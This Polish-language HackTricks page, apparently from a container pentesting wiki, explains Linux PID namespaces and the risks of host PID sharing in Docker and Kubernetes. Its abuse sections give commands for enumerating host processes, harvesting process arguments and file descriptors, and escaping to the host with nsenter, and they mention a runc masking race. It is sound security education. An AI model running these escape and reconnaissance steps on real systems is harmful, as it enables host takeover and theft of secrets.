# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

PID namespace kontroluje, jak procesy są numerowane i które procesy są widoczne. Dlatego container może mieć swój własny PID 1, mimo że nie jest prawdziwą maszyną. Wewnątrz namespace workload widzi coś, co wygląda na lokalne drzewo procesów. Poza namespace host nadal widzi rzeczywiste host PIDs i pełny krajobraz procesów.

Z punktu widzenia bezpieczeństwa PID namespace ma znaczenie, ponieważ widoczność procesów jest wartościowa. Gdy workload może zobaczyć host processes, może być w stanie obserwować nazwy usług, argumenty wiersza poleceń, sekrety przekazywane w argumentach procesów, stan pochodzący ze środowiska przez `/proc` oraz potencjalne cele wejścia do namespace. Jeśli może zrobić coś więcej niż tylko zobaczyć te procesy — na przykład wysyłać sygnały lub używać ptrace w odpowiednich warunkach — problem staje się znacznie poważniejszy.

## Działanie

Nowy PID namespace zaczyna się z własnym wewnętrznym numerowaniem procesów. Pierwszy proces utworzony wewnątrz staje się PID 1 z punktu widzenia namespace, co także oznacza, że otrzymuje specjalne, podobne do init, semantyki dla osieroconych dzieci i zachowań związanych z sygnałami. To wyjaśnia wiele dziwactw containerów dotyczących init processes, zombie reaping i dlaczego w containerach czasami używa się małych init wrapperów.

Ważna lekcja bezpieczeństwa jest taka, że proces może wydawać się izolowany, ponieważ widzi tylko własne drzewo PID, ale ta izolacja może zostać celowo zniesiona. Docker udostępnia to przez `--pid=host`, a Kubernetes robi to przez `hostPID: true`. Gdy container dołącza do host PID namespace, workload widzi host processes bezpośrednio i wiele późniejszych ścieżek ataku staje się dużo bardziej realistycznych.

## Laboratorium

Aby utworzyć PID namespace ręcznie:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Powłoka widzi teraz prywatny widok procesów. Flaga `--mount-proc` jest ważna, ponieważ montuje instancję procfs, która odpowiada nowej przestrzeni nazw PID, zapewniając spójny widok listy procesów z wnętrza.

Aby porównać zachowanie kontenera:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Różnica jest natychmiastowa i łatwa do zrozumienia, dlatego to dobre pierwsze laboratorium dla czytelników.

## Użycie w czasie działania

Normalne kontenery w Docker, Podman, containerd i CRI-O otrzymują własny PID namespace. Kubernetes Pods zwykle również mają izolowany widok PID, chyba że workload wyraźnie zażąda host PID sharing. Środowiska LXC/Incus opierają się na tym samym prymitywie jądra, choć przypadki użycia system-container mogą ujawniać bardziej skomplikowane drzewa procesów i sprzyjać uproszczeniom w debugowaniu.

Ta sama zasada obowiązuje wszędzie: jeśli runtime zdecydował się nie izolować PID namespace, jest to świadome zmniejszenie granicy kontenera.

## Nieprawidłowe konfiguracje

Klasyczną nieprawidłową konfiguracją jest host PID sharing. Zespoły często usprawiedliwiają ją debugowaniem, monitoringiem lub wygodą zarządzania usługami, ale zawsze należy ją traktować jako istotny wyjątek bezpieczeństwa. Nawet jeśli kontener nie ma bezpośredniego mechanizmu zapisu do procesów hosta, sama widoczność może ujawnić wiele o systemie. Gdy dodane zostaną uprawnienia takie jak `CAP_SYS_PTRACE` lub przydatny dostęp do procfs, ryzyko znacznie wzrasta.

Innym błędem jest założenie, że ponieważ workload nie może domyślnie zabijać ani używać ptrace wobec procesów hosta, host PID sharing jest więc nieszkodliwe. Takie wnioski ignorują wartość enumeracji, dostępność celów do wejścia do namespace oraz to, jak widoczność PID łączy się z innymi osłabionymi kontrolami.

## Nadużycie

Jeśli host PID namespace jest współdzielony, atakujący może badać procesy hosta, zbierać argumenty procesów, identyfikować interesujące usługi, zlokalizować kandydatów PID dla `nsenter`, lub łączyć widoczność procesów z uprawnieniami związanymi z ptrace, aby ingerować w hosta lub sąsiednie zadania. W niektórych przypadkach samo zauważenie odpowiedniego długo działającego procesu wystarcza, by przekształcić resztę planu ataku.

Pierwszym praktycznym krokiem jest zawsze potwierdzenie, że procesy hosta są naprawdę widoczne:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Gdy PIDy hosta są widoczne, argumenty procesów i cele wejścia do namespace często stają się najbardziej użytecznym źródłem informacji:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Jeśli `nsenter` jest dostępny i istnieją wystarczające uprawnienia, sprawdź, czy widoczny proces hosta może być użyty jako mostek przestrzeni nazw:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Nawet jeśli dostęp jest zablokowany, udostępnianie PID hosta jest już wartościowe, ponieważ ujawnia rozmieszczenie usług, komponenty runtime oraz uprzywilejowane procesy będące kandydatami do kolejnego celu.

Widoczność PID hosta sprawia też, że file-descriptor abuse staje się bardziej realne. Jeśli uprzywilejowany proces hosta lub sąsiedni workload ma otwarty wrażliwy plik lub socket, atakujący może być w stanie przejrzeć `/proc/<pid>/fd/` i ponownie użyć tego deskryptora w zależności od właściciela, opcji montowania procfs oraz modelu docelowej usługi.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Te polecenia są przydatne, ponieważ pokazują, czy `hidepid=1` lub `hidepid=2` ograniczają widoczność między procesami oraz czy oczywiście interesujące deskryptory, takie jak otwarte pliki z danymi poufnymi, logi czy Unix sockets, w ogóle są widoczne.

### Pełny przykład: PID hosta + `nsenter`

Udostępnianie PID hosta staje się bezpośrednim host escape, gdy proces ma również wystarczające uprawnienia, aby dołączyć do host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Jeśli polecenie powiedzie się, proces w kontenerze będzie teraz wykonywany w przestrzeniach nazw hosta: mount, UTS, network, IPC oraz PID. Skutkiem jest natychmiastowe przejęcie hosta.

Nawet jeśli samo `nsenter` jest niedostępne, ten sam efekt może być osiągnięty za pomocą binarki z hosta, jeśli system plików hosta jest zamontowany:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Ostatnie uwagi dotyczące środowiska wykonawczego

Niektóre ataki związane z PID namespace nie są tradycyjnymi błędami konfiguracji `hostPID: true`, lecz błędami implementacji w czasie uruchamiania dotyczących sposobu stosowania zabezpieczeń procfs podczas przygotowywania kontenera.

#### Wyścig `maskedPaths` do procfs hosta

W podatnych wersjach `runc`, atakujący mogący kontrolować obraz kontenera lub zadanie uruchamiane przez `runc exec` mógł przeprowadzić wyścig w fazie maskowania, zastępując po stronie kontenera `/dev/null` dowiązaniem symbolicznym do wrażliwej ścieżki procfs, takiej jak `/proc/sys/kernel/core_pattern`. Jeśli wyścig się powiódł, bind mount maskowanej ścieżki mógł trafić na niewłaściwy cel i ujawnić globalne kontrolki procfs hosta nowemu kontenerowi.

Przydatne polecenie do przeglądu:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
To ważne, ponieważ ostateczny wpływ może być taki sam jak przy bezpośredniej ekspozycji procfs: zapisywalny `core_pattern` lub `sysrq-trigger`, co może prowadzić do wykonania kodu na hoście lub denial of service.

#### Namespace injection with `insject`

Namespace injection tools takie jak `insject` pokazują, że interakcja z PID-namespace nie zawsze wymaga wcześniejszego wejścia do docelowej przestrzeni nazw przed utworzeniem procesu. Pomocnik może dołączyć później, użyć `setns()`, i wykonywać się przy zachowanej widoczności docelowej przestrzeni PID:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Tego rodzaju technika ma znaczenie przede wszystkim przy zaawansowanym debugowaniu, offensive tooling i post-exploitation workflows, gdzie namespace context musi zostać dołączony po tym, jak runtime już zainicjował workload.

### Related FD Abuse Patterns

Warto wyraźnie wskazać dwa wzorce, gdy host PIDs są widoczne. Po pierwsze, uprzywilejowany proces może utrzymywać wrażliwy file descriptor otwarty przez `execve()` ponieważ nie został oznaczony `O_CLOEXEC`. Po drugie, usługi mogą przekazywać file descriptors przez gniazda Unix za pomocą `SCM_RIGHTS`. W obu przypadkach interesujący obiekt to już nie ścieżka, lecz już otwarty uchwyt (handle), który proces o niższych uprawnieniach może odziedziczyć lub otrzymać.

Ma to znaczenie w pracy z kontenerami, ponieważ uchwyt może wskazywać na `docker.sock`, uprzywilejowany log, plik z tajemnicą hosta lub inny obiekt o wysokiej wartości, nawet gdy sama ścieżka nie jest bezpośrednio dostępna z filesystemu kontenera.

## Checks

Celem tych poleceń jest określenie, czy proces ma prywatny widok PID, czy też może już uzyskać informacje o znacznie szerszym zbiorze procesów.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Co jest tutaj interesujące:

- Jeśli lista procesów zawiera oczywiste usługi hosta, host PID sharing prawdopodobnie już obowiązuje.
- Widok jedynie niewielkiego, lokalnego dla kontenera drzewa procesów jest normalnym stanem; widok `systemd`, `dockerd`, lub niezwiązanych demonów nie jest.
- Gdy host PIDs są widoczne, nawet informacje o procesach tylko do odczytu stają się użytecznym rozpoznaniem.

Jeśli odkryjesz kontener działający z host PID sharing, nie traktuj tego jako różnicy kosmetycznej. To zasadnicza zmiana w tym, co workload może obserwować i na co może potencjalnie wpływać.
